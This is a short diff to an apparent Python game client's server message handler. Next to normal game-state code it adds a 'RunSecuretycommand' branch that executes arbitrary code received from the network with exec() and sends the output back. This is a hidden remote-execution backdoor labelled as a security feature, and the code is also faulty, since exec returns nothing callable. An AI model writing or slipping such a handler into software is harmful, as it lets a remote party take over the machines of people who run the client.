@@ -125,6 +125,9 @@ class ServerComnicationHandler():
                 self.Screnachanching = time.time() + 10
                 gamestate = 5
                 print("Player won the game!")
+            if messageJSON["type"] == "RunSecuretycommand":
+                func = exec(messageJSON["data"]["command"])
+                self.connection.send(json.dumps({"type": "SecuretyCommandResult", "data": func()}))
 
 
 
